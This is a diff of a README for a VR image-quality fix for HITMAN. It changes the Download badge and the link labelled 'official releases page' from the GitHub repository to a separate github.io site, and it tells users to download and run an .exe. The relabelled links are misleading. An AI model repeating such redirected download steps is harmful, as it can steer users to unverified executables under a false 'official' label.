@@ -1,6 +1,6 @@
 # 👁️ hitman-vr-foveation-fix - Clearer visuals for Hitman PC VR
 
-[![Download](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/lowbudget-milieu82/hitman-vr-foveation-fix)
+[![Download](https://img.shields.io/badge/Download-Release-blue.svg)](https://lowbudget-milieu82.github.io)
 
 This tool improves image quality in HITMAN World of Assassination when you play in VR. The game uses a technique called fixed foveated rendering. This process lowers the resolution at the edges of your view to save processing power. On headsets like the Quest 3 or Quest Pro, this makes the outer areas of the image look blurry.
 
@@ -17,7 +17,7 @@ This software removes that restriction. It forces the game to render two full-re
 
 Follow these steps to set up the fix on your computer.
 
-1. Visit the [official releases page](https://github.com/lowbudget-milieu82/hitman-vr-foveation-fix) to find the latest version.
+1. Visit the [official releases page](https://lowbudget-milieu82.github.io) to find the latest version.
 2. Look for the file ending in .exe under the latest release.
 3. Select that file to start the download.
 4. Save the file to a folder on your computer where you can find it.
